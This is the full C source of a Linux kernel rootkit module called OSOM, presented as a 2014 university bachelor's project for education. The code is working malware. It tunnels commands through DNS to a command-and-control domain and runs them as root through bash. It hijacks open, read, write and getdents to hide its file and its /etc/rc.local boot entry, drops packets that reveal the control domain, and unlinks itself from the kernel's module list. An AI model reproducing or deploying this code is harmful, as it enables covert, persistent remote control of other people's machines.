/* Source code for the OSOM rootkit, as part of the bachelor's project of
 * Morten Espensen and Niklas Hoej:
 * Rootkits: Out of Sight, Out of Mind.
 * University of Copenhagen, Department of Computer Science, 2014.
 *
 * This is a non-stable version exclusively intended for educational purposes.
*/
#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/skbuff.h>
#include <linux/slab.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/string.h>
#include <net/udp.h>
#include <linux/kmod.h>
#include <linux/workqueue.h>
#include <linux/netdevice.h>
#include <linux/highmem.h>
#include <net/ip.h>
#include <asm/unistd.h>
#include <linux/list.h>
#include <linux/dirent.h>
#include <linux/kobject.h>
#include <linux/sched.h>
#include <linux/fdtable.h>
#include <asm/uaccess.h>

#define INIT_SIZE 6
#define JUMP_SIZE 6

/* Macros to hijack and unhijack kernel functions. See init/exit functions. */
#define   HIJACK(f)   hijack_fun(f ## _addr, f ## _code, _ ## f, f ## _hijack)
#define UNHIJACK(f) unhijack_fun(f ## _addr, f ## _code)

#define IP_HDR_LEN 20

#define _DNS_PORT 53
#define _DNS_MIN_LEN 38

#define _DNS_QR_RESPONSE 1
#define _DNS_QTYPE_A 1
#define _DNS_ATYPE_A 1
#define _DNS_ACLASS_IPv4 1
#define _DNS_ANSWER_LEN 16

/* Static addresses read from /boot/System.map-$(uname -r). */
void *open_addr        = (void *)0xc10a3eb3;
void *read_addr        = (void *)0xc10a49a0;
void *write_addr       = (void *)0xc10a4a01;
void *getdents_addr    = (void *)0xc10afa2c;
void *packet_rcv_addr  = (void *)0xc127004d;
void *tpacket_rcv_addr = (void *)0xc1271f1d;

/* Buffers containing assembly instructions pertaining to the hijacking of
 * kernel functions. First 6 bytes of *_code is the original function code.
 * The next 4 bytes, and *_hijack, is the return code to an address.
 * The address is placed where the zeroes are currently. */
static char open_code[INIT_SIZE + JUMP_SIZE] = "\x00\x00\x00\x00\x00\x00\x68\x00\x00\x00\x00\xc3", open_hijack[JUMP_SIZE] = "\x68\x00\x00\x00\x00\xc3";
static char read_code[INIT_SIZE + JUMP_SIZE] = "\x00\x00\x00\x00\x00\x00\x68\x00\x00\x00\x00\xc3", read_hijack[JUMP_SIZE] = "\x68\x00\x00\x00\x00\xc3";
static char write_code[INIT_SIZE + JUMP_SIZE] = "\x00\x00\x00\x00\x00\x00\x68\x00\x00\x00\x00\xc3", write_hijack[JUMP_SIZE] = "\x68\x00\x00\x00\x00\xc3";
static char getdents_code[INIT_SIZE + JUMP_SIZE] = "\x00\x00\x00\x00\x00\x00\x68\x00\x00\x00\x00\xc3", getdents_hijack[JUMP_SIZE] = "\x68\x00\x00\x00\x00\xc3";
static char packet_rcv_code[INIT_SIZE + JUMP_SIZE] = "\x00\x00\x00\x00\x00\x00\x68\x00\x00\x00\x00\xc3", packet_rcv_hijack[JUMP_SIZE] = "\x68\x00\x00\x00\x00\xc3";
static char tpacket_rcv_code[INIT_SIZE + JUMP_SIZE] = "\x00\x00\x00\x00\x00\x00\x68\x00\x00\x00\x00\xc3", tpacket_rcv_hijack[JUMP_SIZE] = "\x68\x00\x00\x00\x00\xc3";

/* Function pointers to call the original functions using the code above. */
asmlinkage int (*call_open) (const char *, int, int) = (void *)open_code;
asmlinkage int (*call_read) (unsigned int, char __user *, size_t) = (void *)read_code;
asmlinkage int (*call_write) (unsigned int, char __user *, size_t) = (void *)write_code;
asmlinkage int (*call_getdents)(unsigned int, struct linux_dirent64 __user *, unsigned int) = (void *)getdents_code;
int (*call_packet_rcv)(struct sk_buff *, struct net_device *, struct packet_type *, struct net_device *) = (void *)packet_rcv_code;
int (*call_tpacket_rcv)(struct sk_buff *, struct net_device *, struct packet_type *, struct net_device *) = (void *)tpacket_rcv_code;

static const char bash_init_cmd[] = "/sbin/insmod /lib/modules/3.2.0-4-486/kernel/drivers/misc/osom.ko\n";
static const char *module_path = "/etc/rc.local";

/* DNS formatted domain name of the control server. */
char magic_url[] = "\x09" "dnstunnel" "\x08" "espensen" "\x02" "me";

/* Hooks and workqueues. See init/exit functions. */
static struct nf_hook_ops nfho_post, nfho_pre;
static struct workqueue_struct *queue = NULL;

/* DNS HELPER FUNCTIONS. */
/* These functions get and set the question record (qr) field, the number of
 * questions and answers (qs and as), the question name (qname), question and
 * answer type and class (qtype, qclass, atype, aclass) and the IP field (aip).
 * dns_next_a() returns the address of the next A record given some A record. */

static inline int dns_qr(char *payload) {
    return (unsigned char)payload[2] >> 7;
}

static inline __u16 dns_num_qs(char *payload) {
    return *(__u16*)&payload[5];
}

static inline __u16 dns_num_as(char *payload) {
    return *(__u16*)&payload[7];
}

static inline void dns_set_num_as(char *payload, __u16 len) {
    *(__u16*)&payload[7] = len;
}

static inline char *dns_qname(char *payload) {
    return &payload[12];
}

static inline __u16 dns_qtype(char *qname_end) {
    return *(__u16*)&qname_end[1];
}

static inline __u16 dns_qclass(char *qname_end) {
    return *(__u16*)&qname_end[3];
}

static inline __u16 dns_atype(char *answer, int alen) {
    printk("Atype len is: %u\n", alen);
    return *(__u16*)&answer[alen + 1];
}

static inline __u16 dns_aclass(char *answer, int alen) {
    printk("Atype len is: %u\n", alen);
    return *(__u16*)&answer[alen + 3];
}

static inline char *dns_aip(char *answer, int alen) {
    return &answer[alen + 10];
}

static inline char *dns_next_a(char *answer) {
    return &answer[_DNS_ANSWER_LEN];
}

/* Struct used to contain a work struct and a command to be executed. */
typedef struct {
    struct work_struct work;
    char cmd[500];
} bash_call;

/* Struct used when parsing and executing commands provided in A resource
 * records of malicious DNS packets. */
typedef struct {
    int magic_found;
    char *magic_start;
    int num_real_answers;
    int num_magic_answers;
} magic;

/* Make the page writable. */
void make_rw(unsigned long address) {
    unsigned int level;
    pte_t *pte = lookup_address(address, &level);
    if(pte->pte &~ _PAGE_RW)
        pte->pte |= _PAGE_RW;
    return;
}

/* Make the page write protected. */
void make_ro(unsigned long address) {
    unsigned int level;
    pte_t *pte = lookup_address(address, &level);
    pte->pte = pte->pte &~ _PAGE_RW;
    return;
}

/* memcmp implementation from http://www.phrack.org/issues.html?issue=58&id=7 */
int memcmp(const void *cs,const void *ct,unsigned count)
{
    const unsigned char *su1, *su2;
    signed char res = 0;

    for( su1 = cs, su2 = ct; 0 < count; ++su1, ++su2, count--)
        if ((res = *su1 - *su2) != 0)
            break;
    return res;
}

/* memcmp implementation from http://www.phrack.org/issues.html?issue=58&id=7 */
void *memmem(char *s1, int l1, char *s2, int l2)
{
    if (!l2) return s1;
    while (l1 >= l2) {
        l1--;
        if (!memcmp(s1,s2,l2))
            return s1;
        s1++;
    }
    return NULL;
}

/* memcpy on protected memory by temporarily disabling protection. */
void memcpy_protected(void *dest, const void *src, size_t n) {
    make_rw((unsigned long)dest);
    memcpy(dest, src, n);
    make_ro((unsigned long)dest);
}

/* memmove on protected memory by temporarily disabling protection. */
void memmove_protected(void *dest, const void *src, size_t n) {
    make_rw((unsigned long)dest);
    memmove(dest, src, n);
    make_ro((unsigned long)dest);
}

/* Call bash to execute command in userspace. */
static void call_bash(struct work_struct * work) {
    bash_call * call = (bash_call*)work;
    char *argv[] = { "/bin/bash", "-c",call->cmd, NULL };
    static char *envp[] = {
        "HOME=/",
        "TERM=linux",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

    kfree(call);
    return;
}

/* Given an initialised magic struct, parse the command from a DNS answer
 * section after the magic "OSOM" identifier. Then schedule a workqueue
 * to execute the command in a shell in userspace. */
static void handle_command(magic *m) {
    int i;
    char *answer;
    bash_call *call;

    call = kmalloc(sizeof(bash_call), GFP_ATOMIC);
    if(call){
        i = 0;
        call->cmd[0] = 0;
        answer = dns_next_a(m->magic_start);

        while(i++ < m->num_magic_answers - 1) {
            strncat(call->cmd, dns_aip(answer, strlen(answer)), 4);
            answer = dns_next_a(answer);
        }

        INIT_WORK((struct work_struct*)call, call_bash);
        queue_work(queue, (struct work_struct*) call);
    /*} else {
        printk("Couldnt alloc call, res: %d\n",(int)call);*/
    }
    return;
}

/* Locate the A resource record in the answers section of a DNS packet where
 * the IP address when ascii interpreted corresponds to "OSOM". */
static void find_magic_answer(magic *m, char *answer, int num_answers) {
    int i = 0, len;
    char *ip, *cur = answer;

    m->magic_found = 0;
    m->num_magic_answers = 0;

    while(i++ < num_answers) {
        len = strlen(cur);

        if(dns_atype(cur, len) != _DNS_ATYPE_A || dns_aclass(cur, len) != _DNS_ACLASS_IPv4)
            break;

        ip = dns_aip(cur, len);
        if(*(unsigned int*)ip == *(unsigned int*)"OSOM") {
            m->magic_found = 1;
            m->magic_start = cur;
            m->num_real_answers = i - 1;
            m->num_magic_answers = num_answers - m->num_real_answers;
            break;
        }
        cur = dns_next_a(cur);
    }
    return;
}

/* NETFILTER HOOK HANDLERS. */

/* Hook handler to the last hook on outgoing network traffic. */
unsigned int hook_func_post(unsigned int hooknum,
        struct sk_buff *skb,
        const struct net_device *in,
        const struct net_device *out,
        int (*okfn)(struct sk_buff *))
{
    // TODO FIXME: don't calculate string lengths in function called all the time
    __u16 dst_port;

    struct iphdr *ip_header;
    struct udphdr *udp_header;
    char *udp_payload;
    char *pp;

    int plen = strlen(magic_url), poffset;

    ip_header = ip_hdr(skb);

    /* Be sure this is a UDP packet first and that we can expand it. */
    if (ip_header->protocol == IPPROTO_UDP && skb_tailroom(skb) > plen) {

        // Find the header and payload pointers
        udp_header = (struct udphdr *)(skb->data + sizeof(struct iphdr));
        udp_payload = (char *)udp_header + sizeof(struct udphdr);

        dst_port = ntohs(udp_header->dest);

        /* Check that it's a packet going to port 53, assume that it's dns. */
        if(dst_port == 53 && skb_tailroom(skb) >= plen) {
            /* Expand packet. */
            pp = skb_put(skb, plen);

            /* Find pointer for question end. */
            poffset = 12 + strlen(udp_payload + 12);

            /* Move content after original label further down in the packet and append our C&C domain. */
            memcpy(udp_payload + poffset + plen, udp_payload + poffset, 5);
            strncpy(udp_payload + poffset, magic_url, plen);

            /* Update header data. */
            ip_header->tot_len = htons(ntohs(ip_header->tot_len) + plen);
            udp_header->len = htons(ntohs(udp_header->len) + plen);

            ip_send_check(ip_header);
            udp_header->check = ~csum_tcpudp_magic(ip_header->saddr, ip_header->daddr, skb->len - skb_transport_offset(skb), IPPROTO_UDP, 0);
        }

    }

    return NF_ACCEPT;
}

/* Hook handler to the first hook on incoming network traffic. */
unsigned int hook_func_pre(unsigned int hooknum,
        struct sk_buff *skb,
        const struct net_device *in,
        const struct net_device *out,
        int (*okfn)(struct sk_buff *)) {

    __u16 src_port;

    struct iphdr *ip_header;
    struct udphdr *udp_header;
    char *udp_payload;
    magic m;
    int answers, magic_len, rest_len;
    char *magic_offset = 0;

    ip_header = ip_hdr(skb);

    if (ip_header->protocol == IPPROTO_UDP){
        udp_header = (struct udphdr *)(skb->data + sizeof(struct iphdr));
        udp_payload = (char *)udp_header + sizeof(struct udphdr);

        src_port = ntohs(udp_header->source);

        if(src_port == _DNS_PORT &&
                ntohs(udp_header->len) >= _DNS_MIN_LEN &&
                dns_qr(udp_payload) == _DNS_QR_RESPONSE &&
                dns_num_qs(udp_payload) == 1 &&
                (magic_offset = strstr(dns_qname(udp_payload), magic_url)) &&
                strlen(magic_offset) == sizeof(magic_url) - 1 &&
                dns_qtype(magic_offset + sizeof(magic_url)) == _DNS_QTYPE_A) {

            answers = dns_num_as(udp_payload);
            find_magic_answer(&m, magic_offset + sizeof(magic_url) + 4, answers);

            if(m.magic_found && m.num_magic_answers > 1) {
                handle_command(&m);

                dns_set_num_as(udp_payload, m.num_real_answers);
                magic_len = m.num_magic_answers * _DNS_ANSWER_LEN;
                rest_len = ntohs(udp_header->len) - (m.magic_start - (char*)udp_header) - magic_len;

                /* Copy answers up. */
                memcpy(m.magic_start, m.magic_start + magic_len, rest_len);

                memcpy(magic_offset, magic_offset + strlen(magic_offset), ntohs(udp_header->len) - (magic_offset - (char*)udp_header));

                magic_len += strlen(magic_url);

                skb_trim(skb, magic_len);

                udp_header->len = htons(ntohs(udp_header->len) - magic_len);
                ip_header->tot_len = htons(ntohs(ip_header->tot_len) - magic_len);
                ip_send_check(ip_header);
                udp_header->check = 0;
            } else if(memmem((void*) ip_header, ntohs(ip_header->tot_len), (void*)magic_url, strlen(magic_url))) {
                /* A packet did not match the filters but contains our magic url.
                 * It might be a failed dns lookup. Drop it and pretend nothing
                 * happened. Improvement: Clean up the mess and pass it on. */
                return NF_DROP;
            }
        }

        // source port er dns
        // payload længde er tilstrækkelig
        // dns qr == response
        // questions == 1
        // question url length > our url, find our offset, match on our url
        // loop through answers, for each:
        // check that
        // if magic has started, note offset where it starts (magic can be two entries xor'ed to osom)
        // interpret magic
        // strip away question url
        // shrink payload to magic offset - length of our url
    }
    return NF_ACCEPT;
}

/* FUNCTIONS FOR HIJACKING. */

/* Function to match file path associated with file descriptor. */
int match_filepath(unsigned int fd, struct files_struct *files, const char *filepath) {
    /* Source: http://stackoverflow.com/questions/8250078/how-can-i-get-a-filename-from-a-file-descriptor-inside-a-kernel-module */
    char *tmp;
    char *pathname;
    struct file *file;
    struct path path;

    file = fcheck_files(files, fd);
    if (!file) {
        return 0; //-ENOENT;
    }

    path = file->f_path;
    path_get(&file->f_path);

    tmp = (char *)__get_free_page(GFP_TEMPORARY);

    if (!tmp) {
        path_put(&path);
        return 0; //-ENOMEM;
    }

    pathname = d_path(&path, tmp, PAGE_SIZE);
    path_put(&path);

    if (IS_ERR(pathname)) {
        free_page((unsigned long)tmp);
        return 0; //PTR_ERR(pathname);
    }

    /* If the file path matches the provided path, return success. */
    if(!strcmp(filepath, pathname))
        return 1;

    free_page((unsigned long)tmp);
    return 0;
}

/* New function to hijack sys_getdents. */
asmlinkage int _getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count) {
    // TODO FIXME: fix local static string usage
    int ret, size;
    struct linux_dirent64 *cur = dirp;
    int accu_offset = 0;

    size = call_getdents(fd, dirp, count);
    ret = size;
    while (size > 0) {
        if(!strcmp(cur->d_name,"osom.ko")){
            accu_offset += cur->d_reclen;
            memmove((char *)cur, (char *)cur + cur->d_reclen, (char *)dirp + ret - ((char *)cur + cur->d_reclen) );
            continue;
        }

        size -= cur->d_reclen;
        cur = (struct linux_dirent64 *) ((char*)cur + cur->d_reclen);
    }
    return ret - accu_offset;
}

/* New function to hijack sys_open. */
asmlinkage int _open(const char *filename, int flags, int mode) {
    //TODO FIXME: Fix local static string usage
    int ret;

    if(strstr(filename, "osom.ko")) {
        ret = -1;
    } else {
        ret = call_open(filename, flags, mode);
    }

    return ret;
}

/* New function to hijack sys_read. */
asmlinkage int _read(unsigned int fd, char __user *buf, size_t count) {
    int ret, len = strlen(bash_init_cmd);
    struct file *file;

    file = fcheck_files(current->files, fd);
    if (!file) {
        return -1; //-ENOENT;
    }

    if(match_filepath(fd, current->files, module_path))
        file->f_pos += len;

    ret = call_read(fd, buf, count);

    return ret;
}

/* New function to hijack sys_write. */
asmlinkage int _write(unsigned int fd, char __user *buf, size_t count) {
    int ret, fpos, match, len = strlen(bash_init_cmd);
    struct file *file;
    char *prebuf;
    mm_segment_t old_fs;

    file = fcheck_files(current->files, fd);
    if (!file) {
        return -1; //-ENOENT;
    }

    match = match_filepath(fd, current->files, module_path);
    if(match)
        file->f_pos += len;

    ret = call_write(fd, buf, count);

    if(match) {
        fpos = file->f_pos;

        prebuf = kmalloc(len, GFP_KERNEL);
        memcpy(prebuf, bash_init_cmd, len);

        file->f_pos = 0;
        old_fs = get_fs();
        set_fs(KERNEL_DS);

        call_write(fd, prebuf, len);

        set_fs(old_fs);
        file->f_pos = fpos;
        kfree(prebuf);
    }

    return ret;
}

/* New function to hijack packet_rcv. */
int _packet_rcv(struct sk_buff *skb, struct net_device *dev,
        struct packet_type *pt, struct net_device *orig_dev) {
    int ret;
    struct iphdr *ip_header;

    /* If our domain name is found in the packet, drop it. */
    ip_header = ip_hdr(skb);
    if(memmem((void*) ip_header, ntohs(ip_header->tot_len), (void*)magic_url, strlen(magic_url)) != NULL) {
        consume_skb(skb);
        return 0;
    }

    call_packet_rcv(skb, dev, pt, orig_dev);

    return ret;
}

/* New function to hijack packet_rcv. */
int _tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
        struct packet_type *pt, struct net_device *orig_dev) {
    int ret;
    struct iphdr *ip_header;

    /* If our domain name is found in the packet, drop it. */
    ip_header = ip_hdr(skb);
    if(memmem((void*) ip_header, ntohs(ip_header->tot_len), (void*)magic_url, strlen(magic_url)) != NULL) {
        consume_skb(skb);
        return 0;
    }

    ret = call_tpacket_rcv(skb, dev, pt, orig_dev);

    return ret;
}

void hijack_fun(void *fun_addr, char *fun_code, void *hijack_fun, char *hijack_code) {
    /* Copy first INIT_SIZE bytes of stack frame initialisation to fun_code. */
    memcpy(fun_code, fun_addr, INIT_SIZE);
    /* Copy the address of the original function but INIT_SIZE bytes in,
     * into the $addr part of the 'pop $addr, ret' code. */
    *(long *)&fun_code[INIT_SIZE + 1] = (long)((char *)fun_addr + INIT_SIZE);
    /* fun_code will now execute first INIT_SIZE (instruction aligned) code
     * of the hijacked function, and then jump to it after the INIT_SIZE bytes. */

    /* Copy $addr into the 'pop $addr, ret' hijack code. */
    *(long *)&hijack_code[1] = (long)hijack_fun;
    /* Replace the beginning of the function with the hijack code. */
    memcpy_protected(fun_addr, hijack_code, JUMP_SIZE);
    return;
}

void unhijack_fun(void *fun_addr, char *fun_code){
    /* Restore the original initalisation code of the function. */
    memcpy_protected(fun_addr, fun_code, JUMP_SIZE);
    return;
}

/* Hide the module information from the kernel. Partially unloads it. */
void hide_module(struct module *mod){
    list_del(&mod->list);
    kobject_del(&mod->mkobj.kobj);
    mod->sect_attrs = NULL;
    mod->notes_attrs = NULL;
    memset(mod->name, 0, 60);
    return;
}

/* Init function called at module initialisation.
 * Create work queue, hooks and hijack functions. Also hide module. */
static int __init osom_init(void) {
    queue = create_workqueue("osom");
    if(queue){
        /* Fill in our hook structure */
        nfho_post.hook     = hook_func_post;
        /* Handler function */
        nfho_post.hooknum  = NF_INET_POST_ROUTING; /* Last hook for IPv4 */
        nfho_post.pf       = PF_INET;
        nfho_post.priority = NF_IP_PRI_FIRST;   /* Make our func first */

        nf_register_hook(&nfho_post);

        /* Fill in our hook structure */
        nfho_pre.hook     = hook_func_pre;
        /* Handler function */
        nfho_pre.hooknum  = NF_INET_PRE_ROUTING; /* First hook for IPv4 */
        nfho_pre.pf       = PF_INET;
        nfho_pre.priority = NF_IP_PRI_FIRST;   /* Make our func first */

        nf_register_hook(&nfho_pre);

        /* The HIJACK macro usage of 'open' corresponds to:
         * hijack_fun(open_addr, open_code, _open, open_hijack); */
        HIJACK(open);
        HIJACK(read);
        HIJACK(write);
        HIJACK(getdents);
        HIJACK(packet_rcv);
        HIJACK(tpacket_rcv);
        hide_module(&__this_module);
    }

    return 0;
}

/* Exit function called at module removal.
 * Clean up workqueue, hooks and hijacked functions. */
static void __exit osom_exit(void) {
    flush_workqueue(queue);
    destroy_workqueue(queue);
    nf_unregister_hook(&nfho_post);
    nf_unregister_hook(&nfho_pre);

    /* The UNHIJACK macro usage of 'open' corresponds to:
     * unhijack_fun(open_addr, open_code); */
    UNHIJACK(open);
    UNHIJACK(read);
    UNHIJACK(write);
    UNHIJACK(getdents);
    UNHIJACK(packet_rcv);
    UNHIJACK(tpacket_rcv);

    return;
}

MODULE_AUTHOR("Morten Espensen and Niklas Hoej");
MODULE_DESCRIPTION("Rootkits: Out of Sight, Out of Mind (OSOM). Bachelor project. Rootkit.");
MODULE_LICENSE("GPL");
MODULE_VERSION("1.3.3.7");

module_init(osom_init);
module_exit(osom_exit);
